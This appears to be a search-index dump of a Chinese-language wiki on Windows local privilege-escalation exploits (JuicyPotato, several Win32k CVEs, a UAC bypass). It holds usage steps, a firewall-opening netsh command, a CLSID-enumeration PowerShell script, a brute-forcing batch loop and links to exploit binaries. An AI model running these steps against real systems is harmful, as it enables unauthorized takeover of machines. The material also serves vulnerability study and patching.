) - n port : RPC \u670d\u52a1\u5668\u4fa6\u542c\u7aef\u53e3 ( \u9ed8\u8ba4 135 ) - c { clsid } : CLSID ( default BITS : { 4991 d34b - 80 a1 - 4291 - 83 b6 - 3328366 b9097 } ) https : // github . com / ohpe / juicy - potato / tree / master / CLSID - z \u4ec5\u6d4b\u8bd5 CLSID \u5e76\u6253\u5370\u4ee4\u724c\u7684\u7528\u6237","title":"\u53c2\u6570\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"1.whoami /priv \u5982\u679c\u5f00\u542fSeImpersonate\u6743\u9650\uff1a-t t \u5982\u679c\u5f00\u542fSeAssignPrimaryToken\u6743\u9650\uff1a-t u \u5982\u679c\u5747\u5f00\u542f\uff1a-t * \u5982\u679c\u5747\u672a\u5f00\u542f\uff1a\u65e0\u6cd5\u63d0\u6743 2.\u67e5\u770bRPC\u662f\u5426\u662f135 \u5982\u679c\u88ab\u4fee\u6539(\u4f8b\u5982\u4e3a111)\uff0cjuicypotato\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528-n 111\u6307\u5b9aRPC\u7aef\u53e3 \u627e\u5230\u53e6\u4e00\u7cfb\u7edf\uff0c\u80fd\u591f\u4ee5\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u8fdb\u884c\u8fdc\u7a0bRPC\u767b\u5f55\uff0c\u6b64\u65f6juicypotato\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528-k Windows\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u5141\u8bb8135\u7aef\u53e3\u7684\u5165\u7ad9\u89c4\u5219\u5373\u53ef\u8fdb\u884c\u8fdc\u7a0bRPC\u767b\u5f55\u3002 \u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5141\u8bb8135\u7aef\u53e3\u5165\u7ad9\u7684\u547d\u4ee4\u5982\u4e0b\uff1a netsh advfirewall firewall add rule name=\u201c135\u201d protocol=TCP dir=in localport=135 action=allow 3.\u9009\u62e9\u53ef\u7528\u7684CLSID \u53c2\u8003\u5217\u8868\uff1a https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md \u6839\u636e\u4f60\u7684\u7cfb\u7edf\u7c7b\u578b\u9009\u62e9CLSID\uff08EG:{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}\uff09 \u7136\u540e-c\u6307\u5b9a\u5373\u53ef 4.\u9009\u62e9\u4e00\u4e2a\u7cfb\u7edf\u672a\u5360\u7528\u7684\u7aef\u53e3\u4f5c\u4e3a\u76d1\u542c\u7aef\u53e3 -l\u53c2\u6570\u6307\u5b9a\u5373\u53ef","title":"\u53ef\u5426\u5229\u7528"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#webshelljuicypotato","text":"WebShell\u56e0\u4e3a\u65e0\u6cd5\u53e6\u5916\u8c03\u7528cmd\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u4fee\u6539\u8fc7\u7684JuicyPotato JuicyPotato-webshell.exe -p \u201cwhoami\u201d \u65b0\u5efa get-clid-2012.ps1 New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null $CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N= CLSID ; E={$_.pschildname}} | where-object {$_.appid -ne $null} foreach($a in $CLSID) { Write-Host $a.CLSID } \u5217\u51fa\u6240\u6709CLSID\u5230 CLSID.list \u4e2d Powershell -ep bypass -f get-clid-2012.ps1 CLSID.list \u65b0\u5efa juicypotato.bat @echo off :: Starting port , you can change it set / a port = 10000 SETLOCAL ENABLEDELAYEDEXPANSION FOR / F %% i IN ( CLSID . list ) DO ( echo %% i ! port ! juicypotato - webshell . exe - c %% i - p whoami result . log set RET = ! ERRORLEVEL ! :: echo ! RET ! if !RET! == 1 set / a port = port + 1 ) \u8fd0\u884c juicypotato.bat \u968f\u540e\u6839\u636elog\u7684\u76f8\u5173\u8f93\u51fa\uff0c\u9009\u62e9\u5408\u9002\u7684CLSID\u8fdb\u884c\u6743\u9650\u63d0\u5347\u5373\u53ef http://emonsec.com/web/590.html","title":"WebShell\u4f7f\u7528JuicyPotato"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md \u63cf\u8ff0 Microsoft Windows\u4e2d\u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8eWin32k\u7ec4\u4ef6NtUserSetImeInfoEx\u51fd\u6570\u5185\u90e8SetImeInfoEx\u51fd\u6570\u7684\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406\u5185\u5b58\u4e2d\u7684\u7a7a\u6307\u9488\u5bf9\u8c61\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u7a7a\u6307\u9488\u6f0f\u6d1e\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4ee5\u63d0\u5347\u7684\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c Product Version Update Edition Tested Windows 7 - SP1 \u2714\ufe0f Windows Server 2008 - SP2 Windows Server 2008 R2 SP1 itanium Windows Server 2008 R2 SP1 x64 \u2714\ufe0f \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120 \u5229\u7528\u65b9\u5f0f \u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Release VS2019\uff08V120\uff09X32 Release\uff0c\u9700\u8981\u79fb\u9664shellcode.asm\u8fd9\u4e2a\u6587\u4ef6\u540e\u7f16\u8bd1 \u5f53\u524d\u6d4b\u8bd5\u7cfb\u7edfWindows 7 x64 https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8120","title":"\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2018-8120windowsmd","text":"","title":"\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"Microsoft Windows\u4e2d\u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8eWin32k\u7ec4\u4ef6NtUserSetImeInfoEx\u51fd\u6570\u5185\u90e8SetImeInfoEx\u51fd\u6570\u7684\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406\u5185\u5b58\u4e2d\u7684\u7a7a\u6307\u9488\u5bf9\u8c61\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u7a7a\u6307\u9488\u6f0f\u6d1e\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4ee5\u63d0\u5347\u7684\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Product Version Update Edition Tested Windows 7 - SP1 \u2714\ufe0f Windows Server 2008 - SP2 Windows Server 2008 R2 SP1 itanium Windows Server 2008 R2 SP1 x64 \u2714\ufe0f","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8120\uff09Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Release VS2019\uff08V120\uff09X32 Release\uff0c\u9700\u8981\u79fb\u9664shellcode.asm\u8fd9\u4e2a\u6587\u4ef6\u540e\u7f16\u8bd1 \u5f53\u524d\u6d4b\u8bd5\u7cfb\u7edfWindows 7 x64 https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8120","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md \u63cf\u8ff0 Microsoft Windows\u4e2d\u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8eWin32k\u7ec4\u4ef6\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406\u5185\u5b58\u5bf9\u8c61\u3002\u672c\u5730\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u767b\u5f55\u7cfb\u7edf\u5e76\u8fd0\u884c\u7279\u5236\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4ee5\u63d0\u5347\u7684\u6743\u9650\u6267\u884c\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c Product Version Update Edition Tested Windows 10 - Windows 10 1607 Windows 10 1703 Windows 10 1709 \u2714\ufe0f Windows 10 1803 Windows 10 1809 Windows 7 - SP1 Windows 8.1 Windows Rt 8.1 - Windows Server 2008 - SP2 Windows Server 2008 R2 SP1 Windows Server 2012 - Windows Server 2012 R2 Windows Server 2016 - Windows Server 2016 1709 Windows Server 2016 1803 Windows Server 2019 - \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453 \u5229\u7528\u65b9\u5f0f \u7f16\u8bd1\u73af\u5883 VS2019 \uff08V140\uff09X64 Release \u6d4b\u8bd5\u7cfb\u7edfWindows 10 1709 x64 \u9879\u76ee\u6765\u6e90 ze0r https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8453","title":"\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2018-8453windows-md","text":"","title":"\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"Microsoft Windows\u4e2d\u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8eWin32k\u7ec4\u4ef6\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406\u5185\u5b58\u5bf9\u8c61\u3002\u672c\u5730\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u767b\u5f55\u7cfb\u7edf\u5e76\u8fd0\u884c\u7279\u5236\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4ee5\u63d0\u5347\u7684\u6743\u9650\u6267\u884c\u4ee3\u7801\u3002","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Product Version Update Edition Tested Windows 10 - Windows 10 1607 Windows 10 1703 Windows 10 1709 \u2714\ufe0f Windows 10 1803 Windows 10 1809 Windows 7 - SP1 Windows 8.1 Windows Rt 8.1 - Windows Server 2008 - SP2 Windows Server 2008 R2 SP1 Windows Server 2012 - Windows Server 2012 R2 Windows Server 2016 - Windows Server 2016 1709 Windows Server 2016 1803 Windows Server 2019 -","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u7f16\u8bd1\u73af\u5883 VS2019 \uff08V140\uff09X64 Release \u6d4b\u8bd5\u7cfb\u7edfWindows 10 1709 x64","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8453\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_5","text":"ze0r https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8453","title":"\u9879\u76ee\u6765\u6e90"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md \u63cf\u8ff0 \u8fd9\u4e2a\u6f0f\u6d1e\u5c5e\u4e8e\u672a\u6b63\u786e\u5904\u7406\u7a97\u53e3\u7c7b\u6210\u5458\u5bf9\u8c61\u5bfc\u81f4\u7684Double-free\u7c7b\u578b\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c Product Version Update Edition Tested Windows 10 - Windows 10 1607 Windows 10 1703 Windows 10 1709 Windows 10 1803 Windows 10 1809 Windows 7 - SP1 Windows 8.1 - pro N Windows Rt 8.1 - Windows Server 2008 - SP2 Windows Server 2008 R2 itanium Windows Server 2008 R2 x64 Windows Server 2012 - Windows Server 2012 R2 Windows Server 2016 - Windows Server 2016 1709 Windows Server 2016 1803 Windows Server 2019 - \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8639 \u5229\u7528\u65b9\u5f0f \u7f16\u8bd1\u73af\u5883 VS2019\uff08V140\uff09X64 Release \u5728Windows 2008 X64\u4e0a\u6d4b\u8bd5\u901a\u8fc7\u7684EXP\uff0c\u76f4\u63a5\u4e0aGIF\u56fe \u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Debug\uff0c\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u5305\u4f5c\u4e3a\u652f\u6491 https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=40770 Windows 7 X64\u6d4b\u8bd5\u901a\u8fc7\u7684EXP\uff0c\u4e0aGIF\u56fe https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8639","title":"\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2018-8639windows-md","text":"","title":"\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u8fd9\u4e2a\u6f0f\u6d1e\u5c5e\u4e8e\u672a\u6b63\u786e\u5904\u7406\u7a97\u53e3\u7c7b\u6210\u5458\u5bf9\u8c61\u5bfc\u81f4\u7684Double-free\u7c7b\u578b\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Product Version Update Edition Tested Windows 10 - Windows 10 1607 Windows 10 1703 Windows 10 1709 Windows 10 1803 Windows 10 1809 Windows 7 - SP1 Windows 8.1 - pro N Windows Rt 8.1 - Windows Server 2008 - SP2 Windows Server 2008 R2 itanium Windows Server 2008 R2 x64 Windows Server 2012 - Windows Server 2012 R2 Windows Server 2016 - Windows Server 2016 1709 Windows Server 2016 1803 Windows Server 2019 -","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8639","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2018-8639\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u7f16\u8bd1\u73af\u5883 VS2019\uff08V140\uff09X64 Release \u5728Windows 2008 X64\u4e0a\u6d4b\u8bd5\u901a\u8fc7\u7684EXP\uff0c\u76f4\u63a5\u4e0aGIF\u56fe \u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Debug\uff0c\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u5305\u4f5c\u4e3a\u652f\u6491 https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=40770 Windows 7 X64\u6d4b\u8bd5\u901a\u8fc7\u7684EXP\uff0c\u4e0aGIF\u56fe https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2018-8639","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/","text":"\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743 \u5f71\u54cd\u8303\u56f4 Microsoft Windows Server 2019 0 Microsoft Windows Server 2016 0 Microsoft Windows Server 2012 R2 0 Microsoft Windows Server 2012 0 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 1803 0 Microsoft Windows Server 1709 0 Microsoft Windows RT 8.1 Microsoft Windows 8.1 for x64-based Systems 0 Microsoft Windows 8.1 for 32-bit Systems 0 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 10 Version 1809 for x64-based Systems 0 Microsoft Windows 10 Version 1809 for ARM64-based Systems 0 Microsoft Windows 10 Version 1809 for 32-bit Systems 0 Microsoft Windows 10 Version 1803 for x64-based Systems 0 Microsoft Windows 10 Version 1803 for ARM64-based Systems 0 Microsoft Windows 10 Version 1803 for 32-bit Systems 0 Microsoft Windows 10 version 1709 for x64-based Systems 0 Microsoft Windows 10 Version 1709 for ARM64-based Systems 0 Microsoft Windows 10 version 1709 for 32-bit Systems 0 Microsoft Windows 10 version 1703 for x64-based Systems 0 Microsoft Windows 10 version 1703 for 32-bit Systems 0 Microsoft Windows 10 Version 1607 for x64-based Systems 0 Microsoft Windows 10 Version 1607 for 32-bit Systems 0 Microsoft Windows 10 for x64-based Systems 0 Microsoft Windows 10 for 32-bit Systems 0 \u6f0f\u6d1e\u7b80\u4ecb Win32k \u7ec4\u4ef6\u65e0\u6cd5\u6b63\u786e\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\uff0c\u53ef\u5bfc\u81f4\u7279\u6743\u63d0\u5347\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5185\u6838\u6a21\u5f0f\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3001\u5b89\u88c5\u4efb\u610f\u7a0b\u5e8f\u3001\u67e5\u770b\u3001\u66f4\u6539\u6216\u5220\u9664\u6570\u636e\u3001\u6216\u8005\u521b\u5efa\u62e5\u6709\u5b8c\u5168\u7528\u6237\u6743\u9650\u7684\u65b0\u5e10\u6237\u3002 \u6f0f\u6d1e\u590d\u73b0 \u4e0b\u8f7dEXP\uff1a https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe CVE-2019-0803\u4f7f\u7528\u65b9\u6cd5\uff1a CVE-2019-0803.exe cmd cmdline \u4e0a\u4f20EXP\u5230win 7\u865a\u62df\u673a\u5185\uff0c\u4e4b\u540e\u67e5\u770b\u4e00\u4e0b\u5f53\u524d\u7528\u6237\u53d1\u73b0\u662f\u666e\u901a\u7528\u6237\u4e14\u65e0\u6cd5\u5efa\u7acb\u65b0\u7684\u7528\u6237\uff1a \u628a\u4e0a\u4f20\u7684CVE-2019-0803\u62d6\u8fdbcmd\u91cc\uff0c\u521b\u5efa\u65b0\u7528\u6237test \u67e5\u770b\u5f53\u524d\u7528\u6237\u2014\u2014\"whoami\"\uff0c\u6210\u529f\u664b\u5347\u4e3a\u7cfb\u7edf\u7ba1\u7406\u6743\u9650\uff0c\u6210\u529f\u63d0\u6743\uff01 \u6f0f\u6d1eEXP https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe https://blog.csdn.net/Fly_hps/article/details/104236695","title":"\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/#cve-2019-0803win32k","text":"","title":"\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/#_1","text":"Microsoft Windows Server 2019 0 Microsoft Windows Server 2016 0 Microsoft Windows Server 2012 R2 0 Microsoft Windows Server 2012 0 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 1803 0 Microsoft Windows Server 1709 0 Microsoft Windows RT 8.1 Microsoft Windows 8.1 for x64-based Systems 0 Microsoft Windows 8.1 for 32-bit Systems 0 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 10 Version 1809 for x64-based Systems 0 Microsoft Windows 10 Version 1809 for ARM64-based Systems 0 Microsoft Windows 10 Version 1809 for 32-bit Systems 0 Microsoft Windows 10 Version 1803 for x64-based Systems 0 Microsoft Windows 10 Version 1803 for ARM64-based Systems 0 Microsoft Windows 10 Version 1803 for 32-bit Systems 0 Microsoft Windows 10 version 1709 for x64-based Systems 0 Microsoft Windows 10 Version 1709 for ARM64-based Systems 0 Microsoft Windows 10 version 1709 for 32-bit Systems 0 Microsoft Windows 10 version 1703 for x64-based Systems 0 Microsoft Windows 10 version 1703 for 32-bit Systems 0 Microsoft Windows 10 Version 1607 for x64-based Systems 0 Microsoft Windows 10 Version 1607 for 32-bit Systems 0 Microsoft Windows 10 for x64-based Systems 0 Microsoft Windows 10 for 32-bit Systems 0","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/#_2","text":"Win32k \u7ec4\u4ef6\u65e0\u6cd5\u6b63\u786e\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\uff0c\u53ef\u5bfc\u81f4\u7279\u6743\u63d0\u5347\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5185\u6838\u6a21\u5f0f\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3001\u5b89\u88c5\u4efb\u610f\u7a0b\u5e8f\u3001\u67e5\u770b\u3001\u66f4\u6539\u6216\u5220\u9664\u6570\u636e\u3001\u6216\u8005\u521b\u5efa\u62e5\u6709\u5b8c\u5168\u7528\u6237\u6743\u9650\u7684\u65b0\u5e10\u6237\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/#_3","text":"\u4e0b\u8f7dEXP\uff1a https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe CVE-2019-0803\u4f7f\u7528\u65b9\u6cd5\uff1a CVE-2019-0803.exe cmd cmdline \u4e0a\u4f20EXP\u5230win 7\u865a\u62df\u673a\u5185\uff0c\u4e4b\u540e\u67e5\u770b\u4e00\u4e0b\u5f53\u524d\u7528\u6237\u53d1\u73b0\u662f\u666e\u901a\u7528\u6237\u4e14\u65e0\u6cd5\u5efa\u7acb\u65b0\u7684\u7528\u6237\uff1a \u628a\u4e0a\u4f20\u7684CVE-2019-0803\u62d6\u8fdbcmd\u91cc\uff0c\u521b\u5efa\u65b0\u7528\u6237test \u67e5\u770b\u5f53\u524d\u7528\u6237\u2014\u2014\"whoami\"\uff0c\u6210\u529f\u664b\u5347\u4e3a\u7cfb\u7edf\u7ba1\u7406\u6743\u9650\uff0c\u6210\u529f\u63d0\u6743\uff01","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-0803\uff09Win32K\u7ec4\u4ef6\u63d0\u6743/#exp","text":"https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe https://blog.csdn.net/Fly_hps/article/details/104236695","title":"\u6f0f\u6d1eEXP"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e.md \u63cf\u8ff0 \u8be5\u6f0f\u6d1e\u4f4d\u4e8eWindows\u7684UAC\uff08User Account Control\uff0c\u7528\u6237\u5e10\u6237\u63a7\u5236\uff09\u673a\u5236\u4e2d\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows\u4f1a\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u684c\u9762\u4e0a\u663e\u793a\u6240\u6709\u7684UAC\u63d0\u793a\u2014\u2014Secure Desktop\u3002\u8fd9\u4e9b\u63d0\u793a\u662f\u7531\u540d\u4e3aconsent.exe\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4ea7\u751f\u7684\uff0c\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4ee5NT 